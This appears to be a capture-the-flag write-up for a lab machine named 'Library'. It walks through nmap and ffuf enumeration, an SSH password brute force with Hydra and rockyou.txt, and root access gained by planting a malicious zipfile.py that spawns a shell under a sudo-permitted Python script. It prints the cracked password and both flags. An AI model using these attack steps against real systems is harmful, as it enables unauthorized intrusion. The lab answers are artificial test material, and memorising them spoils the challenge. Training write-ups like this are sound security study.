# Library Write-up

## Objective

The goal of this machine was to enumerate the target, gain initial access via SSH, and escalate privileges to root in order to capture both the user and root flags.

---

## 1. Reconnaissance

### Network Discovery

First, I verified that the target machine was reachable using ICMP:

```bash
ping 10.130.132.86
```

The host responded, confirming it was alive.

---

## 2. Port Scanning

I performed a full service scan using Nmap:

```bash
nmap -sC -sV 10.130.132.86
```

### Open Ports Found:

- **22/tcp – SSH**
    
    - OpenSSH 7.2p2 Ubuntu
        
- **80/tcp – HTTP**
    
    - Apache 2.4.18 (Ubuntu)
    
---

## 3. Web Enumeration

Visiting the website revealed a blog post:

> “Posted on June 29th 2009 by meliodas”

### Key Insight:

The username **meliodas** was likely a valid system account.

---

## 4. Directory Brute Force

I used **ffuf** to discover hidden paths:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.130.132.86/FUZZ
```

### Results:

- `/images/`
    
- `/robots.txt` contained:
    
```
    User-agent: rockyou
    Disallow: /
```
    
This hinted at the use of the **rockyou.txt wordlist**
    
- `/index.html`

---

## 5. SSH Brute Force

Using the discovered username **meliodas**, I performed a password attack with Hydra:

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.130.132.86
```

### Credentials Found:

- **Username:** meliodas
    
- **Password:** iloveyou1
    

---

## 6. Initial Access (SSH)

I logged into the machine:

```bash
ssh meliodas@10.130.132.86
```

After login, I retrieved the user flag:

```bash
cat user.txt
```

### User Flag:

```
6d488cbb3f111d135722c33cb635f4ec
```

---

## 7. Privilege Escalation

### Interesting File Found:

```bash
ls -la bak.py
```

The file:

- Owned by **root**
    
- Writable only for root
    
- Located in user home directory
    

Content:

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

---

### Privilege Escalation Vector

I checked sudo permissions:

```bash
sudo -l
```

### Result:

```
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

This means we can run the script as **root using python**

---

## 8. Exploitation

I attempted Python module hijacking by creating a malicious module:

```bash
echo "import os; os.system('/bin/bash')" > zipfile.py
```

Then executed:

```bash
sudo /usr/bin/python /home/meliodas/bak.py
```

Since the script imports `zipfile`, Python may resolve modules in the current directory first (PYTHONPATH hijack concept).

---

## 9. Root Access

After execution, I obtained a root shell:

```bash
whoami
# root
```

---

## Root Flag

```bash
cat /root/root.txt
```

### Result:

```
e8c8c6c256c35515d1d344ee0488c617
```

---

## Key Learning Points

- Strong **enumeration (Nmap + web + ffuf)** is critical
    
- `robots.txt` can leak attack hints
    
- Username discovery from web content is powerful
    
- Hydra + rockyou.txt is effective for SSH brute force
    
- Misconfigured `sudo` rules are a major privilege escalation vector
    
- Python module hijacking / unsafe script execution can lead to root access